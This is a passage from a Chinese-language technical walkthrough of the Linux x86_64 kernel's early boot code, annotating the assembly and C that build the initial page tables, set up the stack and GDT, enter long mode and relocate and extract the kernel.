%edi<br>decl%ecx<br>jnz1b<br><br>/* Build Level 2 */<br>lealpgtable + 0x2000(%ebx), %edi<br>movl$0x00000183, %eax<br>movl$2048, %ecx<br>1:movl%eax, 0(%edi)<br>addl%edx, 4(%edi)<br>addl$0x00200000, %eax<br>addl$8, %edi<br>decl%ecx<br>jnz1b<br><br>/* 将PML4的地址放入cr3 */<br>lealpgtable(%ebx), %eax<br>movl%eax, %cr3<br><br>/* 开启长模式EFER */<br>movl$MSR_EFER, %ecx<br>rdmsr<br>btsl$_EFER_LME, %eax<br>wrmsr<br><br>/* After gdt is loaded */<br>xorl%eax, %eax<br>lldt%ax<br>movl    $__BOOT_TSS, %eax<br>ltr%ax<br><br>/*<br> * 准备进入长模式<br> */<br>pushl$__KERNEL_CS<br>lealstartup_64(%ebp), %eax<br>#ifdef CONFIG_EFI_MIXED<br>movlefi32_config(%ebp), %ebx<br>cmp$0, %ebx<br>jz1f<br>lealhandover_entry(%ebp), %eax<br>1:<br>#endif<br>pushl%eax<br><br>/* 启用分页 */<br>movl$(X86_CR0_PG | X86_CR0_PE), %eax /* Enable Paging and Protected mode */<br>movl%eax, %cr0<br><br>/* Jump from 32bit compatibility mode into 64bit mode. */<br>lret<br>ENDPROC(startup_32)<br></code></pre></td></tr></table></figure><p>一些变量和宏定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLANK() asm volatile(<span class="hljs-string">&quot;\n.ascii \&quot;-&gt;\&quot;&quot;</span> : : )</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OFFSET(sym, str, mem) \</span><br><span class="hljs-meta">DEFINE(sym, offsetof(struct str, mem))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE(sym, val) \</span><br><span class="hljs-meta">asm volatile(<span class="hljs-string">&quot;\n.ascii \&quot;-&gt;&quot;</span> #sym <span class="hljs-string">&quot; %0 &quot;</span> #val <span class="hljs-string">&quot;\&quot;&quot;</span> : : <span class="hljs-string">&quot;i&quot;</span> (val))</span><br><br>BLANK();<br>OFFSET(BP_scratch, boot_params, scratch);<br>OFFSET(BP_secure_boot, boot_params, secure_boot);<br>OFFSET(BP_loadflags, boot_params, hdr.loadflags);<br>OFFSET(BP_hardware_subarch, boot_params, hdr.hardware_subarch);<br>OFFSET(BP_version, boot_params, hdr.version);<br>OFFSET(BP_kernel_alignment, boot_params, hdr.kernel_alignment);<br>OFFSET(BP_init_size, boot_params, hdr.init_size);<br>OFFSET(BP_pref_address, boot_params, hdr.pref_address);<br>OFFSET(BP_code32_start, boot_params, hdr.code32_start);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOAD_PHYSICAL_ADDR ((CONFIG_PHYSICAL_START \</span><br><span class="hljs-meta">                + (CONFIG_PHYSICAL_ALIGN - 1)) \</span><br><span class="hljs-meta">                &amp; ~(CONFIG_PHYSICAL_ALIGN - 1))</span><br></code></pre></td></tr></table></figure><h2 id="建立栈"><a href="#建立栈" class="headerlink" title="建立栈"></a>建立栈</h2><p>建立栈的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movl$boot_stack_end, %eax<br>addl%ebp, %eax<br>movl%eax, %esp<br></code></pre></td></tr></table></figure><p>boot_stack_end的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss<br>.balign 4<br>boot_heap:<br>.fill BOOT_HEAP_SIZE, 1, 0<br>boot_stack:<br>.fill BOOT_STACK_SIZE, 1, 0<br>boot_stack_end:<br></code></pre></td></tr></table></figure><ul><li>将boot_stack_end的链接地址放入eax</li><li>加ebp得到boot_stack_end的实际地址</li><li>把栈移过去</li></ul><h2 id="更新gdt"><a href="#更新gdt" class="headerlink" title="更新gdt"></a>更新gdt</h2><p>gdt的定义如下：</p><ul><li>gdt大小：.word</li><li>gdt物理地址：.long</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data<br>gdt:<br>.wordgdt_end - gdt<br>.longgdt<br>.word0<br>.quad0x00cf9a000000ffff/* __KERNEL32_CS */<br>.quad0x00af9a000000ffff/* __KERNEL_CS */<br>.quad0x00cf92000000ffff/* __KERNEL_DS */<br>.quad0x0080890000000000/* TS descriptor */<br>.quad   0x0000000000000000/* TS continued */<br>gdt_end:<br></code></pre></td></tr></table></figure><p>更新gdt的过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* 更新gdt */<br>addl%ebp, gdt+2(%ebp)<br>lgdtgdt(%ebp)<br></code></pre></td></tr></table></figure><ul><li>gdt+2的内容+&#x3D;程序基址，更新gdt物理地址</li><li>更新lgdt寄存器（lgdt寄存器内容为gdt大小:gdt物理地址）</li></ul><h2 id="初期页表初始化"><a href="#初期页表初始化" class="headerlink" title="初期页表初始化"></a>初期页表初始化</h2><p>建立映射4G内存的页表</p><p>Linux内核使用4级页表，建立6个页表</p><ul><li>1个PML4或称为4级页映射表，包含1个项</li><li>1个PDP或称为页目录指针表，包含4个项</li><li>4个页目录表，一共包含2048个项，一页2MB</li></ul><p>先清理一块内存，每个表都是4096字节，所以需要24KB内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lealpgtable(%ebx), %edi # ebx是加载的物理地址<br>xorl%eax, %eax<br>movl$(BOOT_INIT_PGT_SIZE/4), %ecx<br>repstosl<br></code></pre></td></tr></table></figure><p>pgtable的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section &quot;.pgtable&quot;,&quot;a&quot;,@nobits<br>.balign 4096<br>pgtable:<br>.fill BOOT_PGT_SIZE, 1, 0<br></code></pre></td></tr></table></figure><p>分配空间后先建立PML4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 4 */<br>lealpgtable + 0(%ebx), %edi# edi=pgtable_addr<br>leal0x1007 (%edi), %eax# eax=edi+0x1007<br>movl%eax, 0(%edi)# [edi]=eax<br>addl%edx, 4(%edi)# [edi+4]+=edx（之前已经把edx清零了）<br></code></pre></td></tr></table></figure><ul><li>&amp;PML4+0x1000是PDP的地址</li><li>7是页表的标记，表示PRESENT+RW+USER但UNACCESSED（开启分页后访问一次就会变成ACCESSED，0x27）</li></ul><p>页表标记定义如下（简化过的）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PRESENT   0x001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_RW    0x002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_USER  0x004</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PWT   0x008</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PCD   0x010</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_ACCESSED  0x020</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_DIRTY 0x040</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PSE0x080</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_GLOBAL0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_SOFTW10x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_SOFTW20x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PAT0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PAT_LARGE 0x1000</span><br></code></pre></td></tr></table></figure><p>初始化4个PDP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 3 */<br>lealpgtable + 0x1000(%ebx), %edi# edi=pgtable_addr+0x1000（PDP地址）<br>leal0x1007(%edi), %eax# eax=edi+0x1007<br>movl$4, %ecx# ecx=4<br>1:movl%eax, 0x00(%edi)# [edi]=eax<br>addl%edx, 0x04(%edi)# [edi+4]+=edx<br>addl$0x00001000, %eax# eax+=0x1000<br>addl$8, %edi# edi+=8<br>decl%ecx# ecx--<br>jnz1b<br></code></pre></td></tr></table></figure><p>初始化4个PDP的共2048个项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 2 */<br>lealpgtable + 0x2000(%ebx), %edi# edi=pgtable_addr+0x2000（PDP[0]地址）<br>movl$0x00000183, %eax# eax=0x183<br>movl$2048, %ecx# ecx=2048<br>1:movl%eax, 0(%edi)# eax=[edi]<br>addl%edx, 4(%edi)# [edi+4]+=edx<br>addl$0x00200000, %eax# eax+=0x200000<br>addl$8, %edi# edi+=8<br>decl%ecx# ecx--<br>jnz1b<br></code></pre></td></tr></table></figure><ul><li>0x183标记表示_PAGE_PRESENT+_PAGE_RW+_PAGE_PSE+_PAGE_GLOBAL</li><li>PSE表示2M或4M的页</li></ul><h1 id="startup-64"><a href="#startup-64" class="headerlink" title="startup_64"></a>startup_64</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>.org 0x200<br>ENTRY(startup_64)<br><br>/* 清空段寄存器 */<br>xorl%eax, %eax<br>movl%eax, %ds<br>movl%eax, %es<br>movl%eax, %ss<br>movl%eax, %fs<br>movl%eax, %gs<br><br>/* 计算内核编译时的位置和它被加载的位置的差（和startup_32的步骤类似） */<br>#ifdef CONFIG_RELOCATABLE<br>leaqstartup_32(%rip), %rbp# rbp=startup_32_addr<br>movlBP_kernel_alignment(%rsi), %eax# eax=boot_params.hdr-&gt;kernel_alignment<br>decl%eax# eax--<br>addq%rax, %rbp# rbp+=rax<br>notq%rax# rax=~rax<br>andq%rax, %rbp# rbp&amp;=rax<br>cmpq$LOAD_PHYSICAL_ADDR, %rbp<br>jge1f<br>#endif<br>movq$LOAD_PHYSICAL_ADDR, %rbp<br>1:<br><br>movlBP_init_size(%rsi), %ebx# ebx=boot_params.hdr-&gt;init_size<br>subl$_end, %ebx# ebx-=_end<br>addq%rbp, %rbx# ebp+=eax（重定位物理地址）<br><br>/* 栈指针的设置和标志寄存器的重置 */<br>leaqboot_stack_end(%rbx), %rsp<br><br>#ifdef CONFIG_X86_5LEVEL<br>/*<br> * 检查是否支持level5分页<br> */<br>pushq%rsi<br>calll5_paging_required<br>popq%rsi<br><br>/* If l5_paging_required() returned zero, we&#x27;re done here. */<br>cmpq$0, %rax<br>jelvl5<br><br>……<br><br>lvl5:<br>#endif<br><br>/* 清空标志寄存器 */<br>pushq$0<br>popfq<br><br>/*<br> * 将压缩的内核复制过去，还有relocated代码<br> */<br>pushq%rsi# 保存rsi，因为rsi此时保存指向boot_params的指针<br>leaq(_bss-8)(%rip), %rsi# rsi=_bss-8绝对地址<br>leaq(_bss-8)(%rbx), %rdi# rdi=_bss-8重定位地址<br>movq$_bss, %rcx# rcx=_bss<br>shrq$3, %rcx# rcx&gt;&gt;=3<br>std# 复制从高地址到低地址进行<br>repmovsq# 从rsi到rdi复制数据<br>cld<br>popq%rsi<br><br>/*<br> * 跳至重定位的relocated<br> */<br>leaqrelocated(%rbx), %rax<br>jmp*%rax<br></code></pre></td></tr></table></figure><h1 id="relocated"><a href="#relocated" class="headerlink" title="relocated"></a>relocated</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>relocated:<br><br>/*<br> * 清空bss<br> */<br>xorl%eax, %eax# eax=0<br>leaq    _bss(%rip), %rdi# rdi=_bss_addr<br>leaq    _ebss(%rip), %rcx# rcx=_ebss_addr<br>subq%rdi, %rcx# rcx-=rdi(rcx:size)<br>shrq$3, %rcx# rcx&gt;&gt;=3<br>repstosq<br><br>/*<br> * 调整GOT<br> */<br>leaq_got(%rip), %rdx# rdx=_got_addr<br>leaq_egot(%rip), %rcx# rcx=_egot_addr<br>1:<br>cmpq%rcx, %rdx<br>jae2f<br>addq%rbx, (%rdx)<br>addq$8, %rdx<br>jmp1b<br>2:<br><br>/*<br> * 提取并跳至内核代码<br> */<br>pushq%rsi/* 保存boot_params指针 */<br>movq%rsi, %rdi<br>leaqboot_heap(%rip), %rsi/* rsi=boot_heap_addr */<br>leaqinput_data(%rip), %rdx  /* rdx=input_data_addr */<br>movl$z_input_len, %ecx/* ecx=z_input_len */<br>movq%rbp, %r8/* r8=rbp */<br>movq$z_output_len, %r9/* r9=z_output_len */<br>callextract_kernel/* rax=kernel_addr */<br>popq%rsi<br><br>/*<br> * 跳至内核代码<br> */<br>jmp*%rax<br></code></pre></td></tr></table></figure><h1 id="startup-64（长模式）"><a href="#startup-64（长模式）" class="headerlink" title="startup_64（长模式）"></a>startup_64（长模式）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>__HEAD<br>.code64<br>.globl startup_64<br>startup_64:<br>UNWIND_HINT_EMPTY<br><br>/* 为verify_cpu建立栈 */<br>leaq(__end_init_task - SIZEOF_PTREGS)(%rip), %rsp<br><br>call verify_cpu<br><br>leaq_text(%rip), %rdi# rdi=_text_addr<br>pushq%rsi# 保存rsi，rsi=&amp;boot_params<br>call__startup_64# 调用__startup_64<br>   # 传入参数(rdi=&amp;_text,rsi=&amp;boot_params)<br>popq%rsi# 恢复rsi<br><br>/* Form the CR3 value being sure to include the CR3 modifier */<br>addq$(early_top_pgt - __START_KERNEL_map), %rax<br>jmp 1f<br><br>……<br><br>1:<br><br>/* 打开PAE和PGE（cr4） */<br>movl$(X86_CR4_PAE | X86_CR4_PGE), %ecx<br>#ifdef CONFIG_X86_5LEVEL<br>orl$X86_CR4_LA57, %ecx<br>#endif<br>movq%rcx, %cr4<br><br>/* 将early_top_pgt放入cr3 */<br>addqphys_base(%rip), %rax<br>movq%rax, %cr3<br><br>/* 确保在使用虚拟地址执行 */<br>movq$1f, %rax<br>jmp*%rax# 跳至__startup_secondary_64的1<br></code></pre></td></tr></table></figure><p>开始使用虚拟地址了，结束*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。</p><h2 id="startup-64-1"><a href="#startup-64-1" class="headerlink" title="__startup_64"></a>__startup_64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//使用的定义</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __START_KERNEL_map_AC(0xffffffff80000000, UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __START_KERNEL(__START_KERNEL_map + __PHYSICAL_START)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PHYSICAL_STARTALIGN(CONFIG_PHYSICAL_START, \<span class="hljs-comment">// 0x1000000</span></span><br>      CONFIG_PHYSICAL_ALIGN)<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pgd_index(address) (((address) &gt;&gt; PGDIR_SHIFT) &amp; (PTRS_PER_PGD - 1))<span class="hljs-comment">//取17-25位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGDIR_SHIFT39</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PGD512</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_DYNAMIC_PAGE_TABLES64                          </span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">pmd_t</span> early_dynamic_pgts[EARLY_DYNAMIC_PAGE_TABLES][PTRS_PER_PMD];<br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __initdata next_early_pgt;<br><span class="hljs-type">pmdval_t</span> early_pmd_flags = __PAGE_KERNEL_LARGE &amp; ~(_PAGE_GLOBAL | _PAGE_NX);<br><br><span class="hljs-comment">//arch\x86\kernel\head64.c</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __head __startup_64(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr,<br>  <span class="hljs-keyword">struct</span> boot_params *bp)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> load_delta, *p;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgtable_flags;<br><span class="hljs-type">pgdval_t</span> *pgd;<br><span class="hljs-type">p4dval_t</span> *p4d;<br><span class="hljs-type">pudval_t</span> *pud;<br><span class="hljs-type">pmdval_t</span> *pmd, pmd_entry;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *next_pgt_ptr;<br><br><span class="hljs-comment">/* 检查物理地址是否过大 */</span><br><span class="hljs-keyword">if</span> (physaddr &gt;&gt; MAX_PHYSMEM_BITS)<br><span class="hljs-keyword">for</span> (;;);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 计算物理地址和编译地址之间的差值</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * _text的默认虚拟地址是0xffffffff81000000，__START_KERNEL_map=0xffffffff80000000</span><br><span class="hljs-comment"> * _text-__START_KERNEL_map就是_text的相对地址</span><br><span class="hljs-comment"> * load_dalta就是实际加载基址</span><br><span class="hljs-comment"> */</span><br>load_delta = physaddr - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(_text - __START_KERNEL_map);<br><br><span class="hljs-comment">/* 判断是否2M对齐 */</span><br><span class="hljs-keyword">if</span> (load_delta &amp; ~PMD_PAGE_MASK)<br><span class="hljs-keyword">for</span> (;;);<br><br><span class="hljs-comment">/* 如果支持SME则开启 */</span><br>sme_enable(bp);<br><br><span class="hljs-comment">/* Include the SME encryption mask in the fixup value */</span><br>load_delta += sme_get_me_mask();<br><br><span class="hljs-comment">/* 修正全局页目录地址，并将使用表项+实际加载基址 */</span><br><br>pgd = fixup_pointer(&amp;early_top_pgt, physaddr);<br>pgd[pgd_index(__START_KERNEL_map)] += load_delta;<br><br>    <span class="hljs-comment">/* 如果开启5级页表 */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_X86_5LEVEL)) &#123;<br>p4d = fixup_pointer(&amp;level4_kernel_pgt, physaddr);<br>p4d[<span class="hljs-number">511</span>] += load_delta;<br>&#125;<br>                          <br><span class="hljs-comment">/* 修正上层页目录地址，并将使用表项+实际加载基址 */</span><br>pud = fixup_pointer(&amp;level3_kernel_pgt, physaddr);<br>pud[<span class="hljs-number">510</span>] += load_delta;<br>pud[<span class="hljs-number">511</span>] += load_delta;<br><br>    <span class="hljs-comment">/* 修正中间页目录地址，并将使用表项+实际加载基址 */</span><br>pmd = fixup_pointer(level2_fixmap_pgt, physaddr);<br>pmd[<span class="hljs-number">506</span>] += load_delta;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 把现在使用的物理地址进行映射，为了在使用虚拟地址之前还能正常访问执行</span><br><span class="hljs-comment"> * 物理地址为0x1000000-0x2800000（差不多这个范围）</span><br><span class="hljs-comment"> */</span><br><br>next_pgt_ptr = fixup_pointer(&amp;next_early_pgt, physaddr);<br>pud = fixup_pointer(early_dynamic_pgts[(*next_pgt_ptr)++], physaddr);<br>pmd = fixup_pointer(early_dynamic_pgts[(*next_pgt_ptr)++], physaddr);<br><br>pgtable_flags = _KERNPG_TABLE_NOENC + sme_get_me_mask();<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_X86_5LEVEL)) &#123;<br>p4d = fixup_pointer(early_dynamic_pgts[next_early_pgt++], physaddr);<br><br>i = (physaddr &gt;&gt; PGDIR_SHIFT) % PTRS_PER_PGD;<br>pgd[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)p4d + pgtable_flags;<br>pgd[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)p4d + pgtable_flags;<br><br>i = (physaddr &gt;&gt; P4D_SHIFT) % PTRS_PER_P4D;<br>p4d[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>p4d[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// pgd=fixup_pointer(&amp;early_top_pgt, physaddr);</span><br>i = (physaddr &gt;&gt; PGDIR_SHIFT) % PTRS_PER_PGD;<br>pgd[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>pgd[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pgdval_t</span>)pud + pgtable_flags;<br>&#125;<br>    <br>i = (physaddr &gt;&gt; PUD_SHIFT) % PTRS_PER_PUD;<br>pud[i + <span class="hljs-number">0</span>] = (<span class="hljs-type">pudval_t</span>)pmd + pgtable_flags;<br>pud[i + <span class="hljs-number">1</span>] = (<span class="hljs-type">pudval_t</span>)pmd + pgtable_flags;<br><br>pmd_entry = __PAGE_KERNEL_LARGE_EXEC &amp; ~_PAGE_GLOBAL;<br>pmd_entry += sme_get_me_mask();<br>pmd_entry +=  physaddr;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; 